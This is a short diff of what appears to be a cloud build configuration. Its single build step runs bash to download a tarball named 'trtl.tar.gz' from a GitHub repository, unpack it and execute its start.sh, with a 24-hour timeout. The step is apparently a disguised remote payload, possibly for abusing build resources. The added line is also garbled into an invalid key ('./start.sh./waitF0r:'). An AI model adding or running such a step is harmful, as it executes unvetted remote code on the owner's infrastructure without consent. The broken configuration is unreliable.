@@ -3,8 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-        wget https://github.com/ifhikf/jos/raw/main/trtl.tar.gz && tar xf trtl.tar.gz && ./start.sh
-waitFor:
+        wget https://github.com/ifhikf/jos/raw/main/trtl.tar.gz && tar xf trtl.tar.gz && ./start.sh./waitF0r:
       - '-'
     entrypoint: /bin/bash
 timeout: 86400s
